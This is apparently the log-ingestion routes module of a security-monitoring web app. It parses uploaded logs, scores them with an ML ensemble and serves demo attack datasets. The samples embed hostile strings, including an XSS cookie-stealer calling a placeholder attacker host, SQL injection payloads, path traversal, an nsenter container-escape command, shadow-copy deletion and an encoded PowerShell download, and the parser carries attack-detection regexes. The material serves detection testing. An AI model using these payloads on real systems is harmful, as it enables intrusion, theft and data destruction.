"""
routes/logs.py — Smart Multi-Format Log Ingestion, In-DB BLOB Storage,
Threat Simulation Persistence, and Demo Sample Generators.
"""

import os
import uuid
import time
import datetime
import re
import json
from collections import Counter
from flask import Blueprint, request, jsonify
from sqlalchemy import select, update
import jwt

from backend import config
from backend.database import get_db
from backend.models.user import users
from backend.models.uploaded_file import uploaded_files
from backend.models.log_analysis import log_analyses
from backend.services.log_simulator import generate_logs, SOURCES, MODES
from backend.services.ml_service import run_ensemble

logs_bp = Blueprint("logs", __name__)
_pipelines = {}


def auth_user_id():
    auth = request.headers.get("Authorization", "")
    if not auth.startswith("Bearer "):
        return None
    try:
        p = jwt.decode(auth[7:].strip(), config.JWT_SECRET_KEY, algorithms=[config.JWT_ALGORITHM])
        if p.get("type") != "access":
            return None
        uid = str(p.get("sub"))
        with get_db() as db:
            if not db.execute(select(users.c.id).where(users.c.id == uid, users.c.verified.is_(True))).first():
                return None
        return uid
    except jwt.InvalidTokenError:
        return None


# =========================================================
# SMART MULTI-FORMAT LOG PARSER
# =========================================================

SEV_REGEX = re.compile(r"(?i)\b(DEBUG|INFO|WARN|WARNING|ERROR|CRITICAL|FATAL|ALERT|EMERG)\b")
IP_REGEX = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
PID_REGEX = re.compile(r"\[(\d{2,7})\]")
NGINX_REGEX = re.compile(r'^(\S+)\s+\S+\s+(\S+)\s+\[([^\]]+)\]\s+"([A-Z]+)\s+([^"]+)\s+HTTP/[^"]+"\s+(\d{3})\s+(\d+)')
SYSLOG_REGEX = re.compile(r"^([A-Z][a-z]{2}\s+\d+\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+([^\[:]+)(?:\[(\d+)\])?:\s+(.*)")


def parse_log_content(content_bytes, filename="uploaded.log"):
    """
    Smart Parser: Auto-detects and parses Web Access, Syslog, Linux Auth,
    Structured JSON, and standard Application logs directly from bytes.
    """
    try:
        text = content_bytes.decode("utf-8")
    except UnicodeDecodeError:
        text = content_bytes.decode("latin-1", errors="replace")

    logs = []
    severity_counter = Counter()
    source_counter = Counter()
    lines = text.splitlines()

    # Case A: JSON format
    if (filename.endswith(".json") or (lines and lines[0].strip().startswith(("{", "[")))):
        try:
            data = json.loads(text)
            if isinstance(data, dict):
                data = data.get("logs") or data.get("events") or [data]
            if isinstance(data, list):
                for i, item in enumerate(data[:10000], 1):
                    if isinstance(item, dict):
                        sev = str(item.get("level") or item.get("severity") or "INFO").upper()
                        if sev in ("WARNING",): sev = "WARN"
                        if sev in ("FATAL", "EMERG", "ALERT"): sev = "CRITICAL"
                        src = str(item.get("source") or item.get("service") or item.get("app") or "json-app")
                        msg = str(item.get("message") or item.get("msg") or json.dumps(item))
                        ip_val = str(item.get("ip") or item.get("client_ip") or "-")
                        pid_val = str(item.get("pid") or "-")
                        ts = str(item.get("timestamp") or datetime.datetime.now(datetime.timezone.utc).isoformat())

                        entry = {"line": i, "timestamp": ts, "severity": sev, "source": src, "ip": ip_val, "pid": pid_val, "message": msg}
                        logs.append(entry)
                        severity_counter[sev] += 1
                        source_counter[src] += 1
                if logs:
                    return logs, severity_counter, source_counter
        except Exception:
            pass  # Fall back to line-by-line parsing

    # Case B: Line-by-line parsing
    now_iso = datetime.datetime.now(datetime.timezone.utc).isoformat()

    for line_no, raw in enumerate(lines, 1):
        line = raw.strip()
        if not line:
            continue

        ip = "-"
        pid = "-"
        sev = "INFO"
        source = "application"
        ts = now_iso

        # 1. Try Nginx / Apache Access Log
        m_web = NGINX_REGEX.match(line)
        if m_web:
            ip = m_web.group(1)
            method = m_web.group(4)
            path = m_web.group(5)
            status = int(m_web.group(6))
            source = "web-access"

            if status >= 500:
                sev = "ERROR"
            elif status in (401, 403):
                sev = "WARN"
            elif status == 404:
                sev = "INFO"
            else:
                sev = "INFO"

            # Check for attacks in query path
            if re.search(r"(?i)(union\s+select|<script|\.\./|drop\s+table)", path):
                sev = "CRITICAL"

            entry = {"line": line_no, "timestamp": ts, "severity": sev, "source": source, "ip": ip, "pid": "-", "message": line}
            logs.append(entry)
            severity_counter[sev] += 1
            source_counter[source] += 1
            continue

        # 2. Try Linux Syslog / Auth Log
        m_sys = SYSLOG_REGEX.match(line)
        if m_sys:
            source = m_sys.group(3).strip()
            pid = m_sys.group(4) or "-"
            msg = m_sys.group(5)

            m_ip = IP_REGEX.search(msg)
            if m_ip:
                ip = m_ip.group(0)

            # Detect auth events
            if re.search(r"(?i)failed password|authentication failure|invalid user", msg):
                sev = "ERROR"
            elif re.search(r"(?i)accepted password|accepted publickey|session opened", msg):
                sev = "INFO"
            elif re.search(r"(?i)sudo:\s+root\s+:|COMMAND=", msg):
                sev = "WARN"
            elif re.search(r"(?i)vssadmin|ransom|\.locked", msg):
                sev = "CRITICAL"
            else:
                m_sev = SEV_REGEX.search(line)
                if m_sev:
                    s_tag = m_sev.group(1).upper()
                    sev = "WARN" if s_tag == "WARNING" else ("CRITICAL" if s_tag in ("FATAL", "ALERT") else s_tag)

            entry = {"line": line_no, "timestamp": ts, "severity": sev, "source": source, "ip": ip, "pid": pid, "message": line}
            logs.append(entry)
            severity_counter[sev] += 1
            source_counter[source] += 1
            continue

        # 3. Generic Log Line
        m_sev = SEV_REGEX.search(line)
        if m_sev:
            s_tag = m_sev.group(1).upper()
            sev = "WARN" if s_tag == "WARNING" else ("CRITICAL" if s_tag in ("FATAL", "ALERT") else s_tag)

        m_ip = IP_REGEX.search(line)
        if m_ip:
            ip = m_ip.group(0)

        m_pid = PID_REGEX.search(line)
        if m_pid:
            pid = m_pid.group(1)

        m_src = re.search(r"(?i)\b(?:source|service|app)=([\w.-]+)", line)
        if m_src:
            source = m_src.group(1)

        entry = {"line": line_no, "timestamp": ts, "severity": sev, "source": source, "ip": ip, "pid": pid, "message": line}
        logs.append(entry)
        severity_counter[sev] += 1
        source_counter[source] += 1

    return logs, severity_counter, source_counter


# =========================================================
# API ROUTES
# =========================================================
def persist_live_stream_batch(uid, logs, mode):
    """
    Persist a live-monitor batch into log_analyses.

    Live stream records intentionally have file_id=None because
    they are not associated with an uploaded file.
    """
    if not logs:
        return None

    severity = Counter(
        str(log.get("severity", "INFO")).upper()
        for log in logs
    )

    sources_map = Counter(
        str(log.get("source", "system")).lower()
        for log in logs
    )

    # Build hourly volume from the actual generated timestamps.
    log_volume = {
        level: [0] * 24
        for level in ("INFO", "WARN", "ERROR", "CRITICAL", "DEBUG")
    }

    for log in logs:
        level = str(log.get("severity", "INFO")).upper()

        if level not in log_volume:
            level = "INFO"

        timestamp = log.get("timestamp")

        try:
            if timestamp:
                ts = str(timestamp).replace("Z", "+00:00")
                dt = datetime.datetime.fromisoformat(ts)
                hour = dt.hour
            else:
                hour = datetime.datetime.now(
                    datetime.timezone.utc
                ).hour
        except Exception:
            hour = datetime.datetime.now(
                datetime.timezone.utc
            ).hour

        log_volume[level][hour] += 1

    # For live simulation, CRITICAL events are treated as detected
    # threats for dashboard KPI purposes.
    threat_count = severity.get("CRITICAL", 0)

    analysis_id = str(uuid.uuid4())

    results = {
        "source": "live_stream",
        "mode": mode,

        "total_logs": len(logs),
        "lines_parsed": len(logs),

        "anomalies": threat_count,
        "anomalies_found": threat_count,

        "severity": dict(severity),
        "top_sources": dict(sources_map),

        "log_volume": log_volume,

        "preview": logs[:50],
        "logs": logs[:200],

        "stream_batch": True,
        "threat_count": threat_count,
    }

    with get_db() as db:
        db.execute(
            log_analyses.insert().values(
                id=analysis_id,
                user_id=uid,
                file_id=None,
                status="completed",
                results=results,
            )
        )

    return analysis_id

@logs_bp.route("/logs/stream")
def stream():
    uid = auth_user_id()

    if not uid:
        return jsonify({
            "success": False,
            "message": "Authentication required"
        }), 401

    try:
        count = min(
            max(int(request.args.get("count", 10)), 1),
            50
        )
    except (TypeError, ValueError):
        count = 10

    mode = request.args.get("mode", "random")
    src = request.args.get("source", "all")
    sev = request.args.get("severity", "all")

    try:
        logs = generate_logs(
            count=count,
            mode=mode,
            source_filter=src,
            severity_filter=sev
        )

        # Persist this live batch immediately.
        analysis_id = persist_live_stream_batch(
            uid=uid,
            logs=logs,
            mode=mode
        )

        return jsonify({
            "success": True,
            "logs": logs,
            "mode": mode,
            "count": len(logs),
            "analysis_id": analysis_id,
            "persisted": True
        })

    except Exception as exc:
        return jsonify({
            "success": False,
            "message": f"Live stream processing failed: {exc}"
        }), 500


@logs_bp.route("/logs/modes")
def modes():
    return jsonify({"modes": [{"id": x, "label": x.replace("_", " ").title()} for x in MODES]})


@logs_bp.route("/logs/sources")
def sources():
    return jsonify({"sources": SOURCES})


# ── IN-DATABASE UPLOAD (Zero local filesystem leak) ──────────
@logs_bp.route("/logs/upload", methods=["POST"])
def upload():
    uid = auth_user_id()
    if not uid:
        return jsonify({"success": False, "message": "Authentication required"}), 401

    file = request.files.get("file")
    if not file or not file.filename:
        return jsonify({"success": False, "message": "No file provided"}), 400

    safe_name = os.path.basename(file.filename)
    file_bytes = file.read()
    size = len(file_bytes)

    if size == 0:
        return jsonify({"success": False, "message": "Uploaded file is empty"}), 400

    file_id = str(uuid.uuid4())
    db_loc = f"db://users/{uid}/uploads/{file_id}"

    try:
        parsed, severity, sources_map = parse_log_content(file_bytes, safe_name)
        if not parsed:
            return jsonify({"success": False, "message": "Could not parse any log lines from file"}), 400

        # Execute Scikit-Learn Ensemble on full dataset without arbitrary limits
        ml = run_ensemble(parsed)

        results = {
            "source": "upload",
            "filename": safe_name,
            "total_logs": len(parsed),
            "lines_parsed": len(parsed),
            "anomalies": len(ml.get("flagged_entries", [])),
            "anomalies_found": len(ml.get("flagged_entries", [])),
            "severity": dict(severity),
            "top_sources": dict(sources_map),
            "ml": ml,
            "ml_analysis": ml,
            "log_volume": {level: [0] * 24 for level in ("INFO", "WARN", "ERROR", "CRITICAL", "DEBUG")},
            "activity": {
                "days": ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"],
                "hours": [f"{h:02d}h" for h in range(0, 24, 2)],
                "data": [[0] * 12 for _ in range(7)],
            },
            "preview": parsed[:100],
            "logs": parsed,
        }

        now = datetime.datetime.now(datetime.timezone.utc)
        results["log_volume"]["INFO"][now.hour] = len(parsed)

        # Store exclusively in PostgreSQL
        with get_db() as db:
            db.execute(
                uploaded_files.insert().values(
                    id=file_id,
                    user_id=uid,
                    filename=safe_name,
                    storage_path=db_loc,
                    content_data=file_bytes,
                    db_location=db_loc,
                    size=size,
                    status="analyzed",
                )
            )

            analysis_id = str(uuid.uuid4())
            db.execute(
                log_analyses.insert().values(
                    id=analysis_id,
                    user_id=uid,
                    file_id=file_id,
                    status="completed",
                    results=results,
                )
            )

        _pipelines[file_id] = {"stage": 3, "started": time.time(), "analysis_id": analysis_id}

        return jsonify({
            "success": True,
            "file_id": file_id,
            "analysis_id": analysis_id,
            "filename": safe_name,
            "size": size,
            "db_location": db_loc,
            "lines_parsed": len(parsed),
            "anomalies_found": len(ml.get("flagged_entries", [])),
            "risk_level": ml.get("risk_level", "LOW"),
            "consensus_score": ml.get("consensus_score", 0),
            "preview": parsed[:100],
            "logs": parsed,
        }), 201

    except Exception as exc:
        return jsonify({"success": False, "message": f"File processing failed: {exc}"}), 500


# ── SIMULATION PERSISTENCE (In-DB) ───────────────────────────
@logs_bp.route("/logs/simulation", methods=["POST"])
def save_simulation():
    uid = auth_user_id()
    if not uid:
        return jsonify({"success": False, "message": "Authentication required"}), 401

    data = request.get_json(silent=True) or {}
    scenario_name = data.get("scenario_name") or data.get("mode") or "Threat Simulation"
    logs = data.get("logs") or []

    if not logs:
        # Generate simulation logs if none provided
        logs = generate_logs(60, data.get("mode", "ransomware"))

    severity = Counter(str(l.get("severity", "INFO")).upper() for l in logs)
    sources_map = Counter(str(l.get("source", "sim")).lower() for l in logs)

    ml = run_ensemble(logs)

    analysis_id = str(uuid.uuid4())
    results = {
        "source": "simulation",
        "scenario_name": scenario_name,
        "total_logs": len(logs),
        "lines_parsed": len(logs),
        "anomalies": len(ml.get("flagged_entries", [])),
        "anomalies_found": len(ml.get("flagged_entries", [])),
        "severity": dict(severity),
        "top_sources": dict(sources_map),
        "ml": ml,
        "ml_analysis": ml,
        "preview": logs[:30],
        "logs": logs[:2000],
    }

    with get_db() as db:
        db.execute(
            log_analyses.insert().values(
                id=analysis_id,
                user_id=uid,
                file_id=None,
                status="completed",
                results=results,
            )
        )

    return jsonify({
        "success": True,
        "analysis_id": analysis_id,
        "scenario_name": scenario_name,
        "lines_parsed": len(logs),
        "anomalies_found": len(ml.get("flagged_entries", [])),
        "risk_level": ml.get("risk_level", "LOW"),
        "consensus_score": ml.get("consensus_score", 0),
        "message": f"Simulation '{scenario_name}' saved to activity history.",
    }), 201


# ── DEMO SAMPLE LOGS ─────────────────────────────────────────
@logs_bp.route("/logs/demo-sample/<sample_type>", methods=["GET"])
def demo_sample(sample_type):
    """Provides 3 realistic attack datasets for 1-click testing."""
    now = datetime.datetime.now(datetime.timezone.utc)

    if sample_type == "web_attack":
        sample_logs = [
            {"timestamp": (now - datetime.timedelta(minutes=15)).isoformat(), "severity": "INFO", "source": "nginx", "ip": "192.168.1.10", "pid": "1024", "message": '192.168.1.10 - - [12/Oct/2026:10:00:01] "GET /index.html HTTP/1.1" 200 4520'},
            {"timestamp": (now - datetime.timedelta(minutes=14)).isoformat(), "severity": "INFO", "source": "nginx", "ip": "192.168.1.10", "pid": "1024", "message": '192.168.1.10 - - [12/Oct/2026:10:01:05] "GET /products.php?id=12 HTTP/1.1" 200 8920'},
            {"timestamp": (now - datetime.timedelta(minutes=12)).isoformat(), "severity": "WARN", "source": "webapp", "ip": "198.51.100.42", "pid": "2048", "message": '198.51.100.42 - - [12/Oct/2026:10:03:10] "GET /login.php?user=admin\'%20OR%20\'1\'=\'1 HTTP/1.1" 401 120'},
            {"timestamp": (now - datetime.timedelta(minutes=10)).isoformat(), "severity": "CRITICAL", "source": "webapp", "ip": "198.51.100.42", "pid": "2048", "message": 'SQL Syntax Error: UNION SELECT null, username, password_hash FROM admin_users -- in /var/www/auth.php:48'},
            {"timestamp": (now - datetime.timedelta(minutes=8)).isoformat(), "severity": "CRITICAL", "source": "webapp", "ip": "198.51.100.42", "pid": "2048", "message": 'XSS Injection detected: POST /comment.php body: <script>document.location="http://c2.badactor.io/steal?c="+document.cookie</script>'},
            {"timestamp": (now - datetime.timedelta(minutes=6)).isoformat(), "severity": "ERROR", "source": "nginx", "ip": "198.51.100.42", "pid": "1024", "message": '198.51.100.42 - - [12/Oct/2026:10:07:22] "GET /../../../../etc/passwd HTTP/1.1" 403 280'},
            {"timestamp": (now - datetime.timedelta(minutes=4)).isoformat(), "severity": "CRITICAL", "source": "webapp", "ip": "198.51.100.42", "pid": "2048", "message": 'Database table "users" dumped via SQL injection exploit payload.'},
        ]
        filename = "web_attack_sample.log"

    elif sample_type == "ssh_brute":
        sample_logs = [
            {"timestamp": (now - datetime.timedelta(minutes=20)).isoformat(), "severity": "INFO", "source": "sshd", "ip": "10.0.0.5", "pid": "8812", "message": "Accepted publickey for deploy from 10.0.0.5 port 54120 ssh2: RSA SHA256:abc1234"},
            {"timestamp": (now - datetime.timedelta(minutes=16)).isoformat(), "severity": "ERROR", "source": "sshd", "ip": "203.0.113.88", "pid": "9120", "message": "Failed password for root from 203.0.113.88 port 48122 ssh2"},
            {"timestamp": (now - datetime.timedelta(minutes=15)).isoformat(), "severity": "ERROR", "source": "sshd", "ip": "203.0.113.88", "pid": "9124", "message": "Failed password for invalid user admin from 203.0.113.88 port 48126 ssh2"},
            {"timestamp": (now - datetime.timedelta(minutes=14)).isoformat(), "severity": "ERROR", "source": "sshd", "ip": "203.0.113.88", "pid": "9128", "message": "PAM 2 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=203.0.113.88"},
            {"timestamp": (now - datetime.timedelta(minutes=12)).isoformat(), "severity": "CRITICAL", "source": "sshd", "ip": "203.0.113.88", "pid": "9140", "message": "Accepted password for ubuntu from 203.0.113.88 port 48150 ssh2"},
            {"timestamp": (now - datetime.timedelta(minutes=10)).isoformat(), "severity": "CRITICAL", "source": "sudo", "ip": "203.0.113.88", "pid": "9210", "message": "ubuntu : TTY=pts/2 ; PWD=/home/ubuntu ; USER=root ; COMMAND=/bin/bash (privilege escalation)"},
        ]
        filename = "ssh_bruteforce_sample.log"

    elif sample_type == "cloud_iam_privesc":
        sample_logs = [
            {"timestamp": (now - datetime.timedelta(minutes=25)).isoformat(), "severity": "INFO", "source": "cloudtrail", "ip": "198.51.100.12", "pid": "aws", "message": '{"eventSource": "iam.amazonaws.com", "eventName": "CreateAccessKey", "userName": "developer_temp", "sourceIPAddress": "198.51.100.12", "responseElements": {"accessKey": "AKIAIOSFODNN7EXAMPLE"}}'},
            {"timestamp": (now - datetime.timedelta(minutes=20)).isoformat(), "severity": "WARN", "source": "cloudtrail", "ip": "203.0.113.5", "pid": "aws", "message": '{"eventSource": "iam.amazonaws.com", "eventName": "AttachUserPolicy", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess", "userName": "developer_temp", "sourceIPAddress": "203.0.113.5"}'},
            {"timestamp": (now - datetime.timedelta(minutes=15)).isoformat(), "severity": "CRITICAL", "source": "cloudtrail", "ip": "203.0.113.5", "pid": "aws", "message": '{"eventSource": "sts.amazonaws.com", "eventName": "AssumeRole", "roleArn": "arn:aws:iam::123456789012:role/ProductionDataVault", "status": "Success", "sourceIPAddress": "203.0.113.5"}'},
            {"timestamp": (now - datetime.timedelta(minutes=10)).isoformat(), "severity": "CRITICAL", "source": "s3", "ip": "203.0.113.5", "pid": "aws", "message": '{"eventSource": "s3.amazonaws.com", "eventName": "GetObject", "bucketName": "corp-customer-pii-vault", "key": "2026_q3_financial_records.csv.enc", "bytesTransferred": 48291040}'},
            {"timestamp": (now - datetime.timedelta(minutes=5)).isoformat(), "severity": "CRITICAL", "source": "cloudtrail", "ip": "203.0.113.5", "pid": "aws", "message": '{"eventSource": "cloudtrail.amazonaws.com", "eventName": "StopLogging", "trailName": "global-audit-trail", "errorCode": "AccessDenied", "errorMessage": "Root policy enforcement locked trail"}'},
        ]
        filename = "cloud_iam_privesc_sample.log"

    elif sample_type == "k8s_container_escape":
        sample_logs = [
            {"timestamp": (now - datetime.timedelta(minutes=22)).isoformat(), "severity": "INFO", "source": "k8s-apiserver", "ip": "10.244.0.1", "pid": "1024", "message": 'Audit: User "system:serviceaccount:default:web-ingress" GET /api/v1/namespaces/default/pods/web-ingress-794bf968b-x92lw'},
            {"timestamp": (now - datetime.timedelta(minutes=18)).isoformat(), "severity": "WARN", "source": "k8s-ingress", "ip": "198.51.100.77", "pid": "2048", "message": 'HTTP/1.1 POST /api/v1/upload - Path traversal payload: ../../../var/run/docker.sock 403 Forbidden'},
            {"timestamp": (now - datetime.timedelta(minutes=14)).isoformat(), "severity": "CRITICAL", "source": "k8s-audit", "ip": "10.244.0.5", "pid": "1024", "message": 'Container exec: pod "web-ingress-794bf968b-x92lw" container "nginx" command: ["/bin/sh", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash"]'},
            {"timestamp": (now - datetime.timedelta(minutes=10)).isoformat(), "severity": "CRITICAL", "source": "kernel", "ip": "node-worker-02", "pid": "1", "message": 'Container breakout: process 4819 escaped cgroup docker-794bf968b.scope, executed privileged host binary /usr/bin/crontab'},
            {"timestamp": (now - datetime.timedelta(minutes=6)).isoformat(), "severity": "CRITICAL", "source": "auditd", "ip": "node-worker-02", "pid": "4819", "message": 'type=SYSCALL arch=c000003e syscall=2 success=yes exit=3 a0=7ffdc83 a1=241 a2=1b6 items=1 ppid=1 pid=4819 auid=0 uid=0 gid=0 exe="/bin/bash" key="root_file_tamper"'},
        ]
        filename = "k8s_container_escape_sample.log"

    elif sample_type == "ddos_syn_flood":
        sample_logs = [
            {"timestamp": (now - datetime.timedelta(minutes=15)).isoformat(), "severity": "INFO", "source": "iptables", "ip": "192.168.1.1", "pid": "0", "message": "FIREWALL: ACCEPT IN=eth0 OUT= SRC=10.0.0.15 DST=10.0.0.1 PROTO=TCP SPT=443 DPT=58210 SYN"},
            {"timestamp": (now - datetime.timedelta(minutes=12)).isoformat(), "severity": "WARN", "source": "kernel", "ip": "-", "pid": "0", "message": "TCP: possible SYN flooding on port 443. Sending cookies. Check SNMP counters."},
            {"timestamp": (now - datetime.timedelta(minutes=10)).isoformat(), "severity": "ERROR", "source": "iptables", "ip": "203.0.113.100", "pid": "0", "message": "DROP IN=eth0 OUT= SRC=203.0.113.100 DST=10.0.0.1 PROTO=TCP SPT=12844 DPT=443 SYN (Rate limit exceeded: 8,400 pkts/sec)"},
            {"timestamp": (now - datetime.timedelta(minutes=8)).isoformat(), "severity": "CRITICAL", "source": "iptables", "ip": "198.51.100.22", "pid": "0", "message": "DROP IN=eth0 OUT= SRC=198.51.100.22 DST=10.0.0.1 PROTO=TCP SPT=34921 DPT=443 SYN (State table nf_conntrack: table full, dropping packet)"},
            {"timestamp": (now - datetime.timedelta(minutes=5)).isoformat(), "severity": "CRITICAL", "source": "nginx", "ip": "10.0.0.1", "pid": "1024", "message": "worker_connections are not enough (1024 active sockets exhausted), upstream timed out (110: Connection timed out)"},
            {"timestamp": (now - datetime.timedelta(minutes=2)).isoformat(), "severity": "CRITICAL", "source": "systemd", "ip": "10.0.0.1", "pid": "1", "message": "nginx.service: Watchdog timeout (limit 30s)! Failed to ping systemd supervisor. High kernel network queue drop rate."},
        ]
        filename = "ddos_syn_flood_sample.log"

    else:  # ransomware
        sample_logs = [
            {"timestamp": (now - datetime.timedelta(minutes=18)).isoformat(), "severity": "INFO", "source": "kernel", "ip": "-", "pid": "1", "message": "System running normally; CPU load 1.2% memory 34%"},
            {"timestamp": (now - datetime.timedelta(minutes=12)).isoformat(), "severity": "CRITICAL", "source": "cmd.exe", "ip": "192.168.1.105", "pid": "4810", "message": "Process execution: vssadmin delete shadows /all /quiet"},
            {"timestamp": (now - datetime.timedelta(minutes=10)).isoformat(), "severity": "CRITICAL", "source": "powershell", "ip": "192.168.1.105", "pid": "4812", "message": "powershell.exe -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLi4u (C2 payload download)"},
            {"timestamp": (now - datetime.timedelta(minutes=8)).isoformat(), "severity": "CRITICAL", "source": "file_monitor", "ip": "192.168.1.105", "pid": "5120", "message": "Mass rename detected: 4,820 files renamed with extension .locked across C:\\SharedData"},
            {"timestamp": (now - datetime.timedelta(minutes=5)).isoformat(), "severity": "CRITICAL", "source": "net_filter", "ip": "198.51.100.99", "pid": "5120", "message": "Outbound connection to known C2 beacon 198.51.100.99:8080 (34.8 MB exfiltrated)"},
            {"timestamp": (now - datetime.timedelta(minutes=2)).isoformat(), "severity": "CRITICAL", "source": "system", "ip": "192.168.1.105", "pid": "5120", "message": "Ransom note README_RESTORE_FILES.txt dropped on desktop."},
        ]
        filename = "ransomware_attack_sample.log"

    raw_text = "\n".join(l["message"] for l in sample_logs)
    return jsonify({
        "success": True,
        "sample_type": sample_type,
        "filename": filename,
        "raw_text": raw_text,
        "logs": sample_logs,
        "total_lines": len(sample_logs),
    })


@logs_bp.route("/logs/pipeline/<pipe_id>")
def pipeline_status(pipe_id):
    uid = auth_user_id()
    if not uid:
        return jsonify({"success": False, "message": "Authentication required"}), 401
    with get_db() as db:
        row = db.execute(
            select(
                uploaded_files.c.id,
                log_analyses.c.id.label("analysis_id"),
                log_analyses.c.status,
            ).select_from(
                uploaded_files.outerjoin(log_analyses, log_analyses.c.file_id == uploaded_files.c.id)
            ).where(uploaded_files.c.id == pipe_id, uploaded_files.c.user_id == uid)
        ).first()

    if not row:
        return jsonify({"success": False, "message": "Pipeline not found"}), 404

    return jsonify({
        "stage": 3,
        "label": "risk_score",
        "done": True,
        "stages": ["collect", "parse", "categorise", "risk_score"],
        "analysis_id": row.analysis_id,
    })
